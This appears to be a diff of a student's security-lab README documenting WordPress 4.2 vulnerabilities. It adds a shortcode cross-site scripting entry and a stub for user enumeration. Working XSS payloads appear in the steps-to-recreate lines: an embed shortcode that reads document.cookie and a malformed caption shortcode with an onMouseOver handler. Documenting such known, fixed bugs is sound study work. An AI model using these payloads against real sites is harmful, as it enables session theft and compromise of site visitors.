@@ -33,23 +33,23 @@ Time spent: **8** hours spent in total
   - [ ] Steps to recreate: Run a XSS code to bypass the regular expressions and embed shortcode function URL. Users who view the post will execute the code [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(document.cookie)\x3e'][/embed]
   - [ ] Affected source code:
     - [Code Link](https://core.trac.wordpress.org/browser/trunk/src/wp-includes/class-wp-embed.php)
-### 4. (Optional) Vulnerability Name or ID
+### 4. (Optional) WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
+  - [ ] Summary: 
+    - Vulnerability types: XSS
+    - Tested in version: 4.2
+    - Fixed in version: 4.2.5
+  - [ ] GIF Walkthrough: <img src="4.gif" alt="4">
+  - [ ] Steps to recreate: Run a XSS code HACK!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">XSS </a> that allow malformed HTML elements to execute
+  - [ ] Affected source code:
+    - [Code Link](https://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/)
+### 5. (Optional) User Enumeration
   - [ ] Summary: 
     - Vulnerability types:
     - Tested in version: 4.2
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
+    - Fixed in version: N/A
+  - [ ] GIF Walkthrough: <img src="5.gif" alt="5">
   - [ ] Steps to recreate: 
-  - [ ] Affected source code:
-    - [Code Link](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
-### 5. (Optional) Vulnerability Name or ID
-  - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version: 4.2
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
+  - [ ] Affected source code: 
     - [Code Link](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 
 
 ## Assets
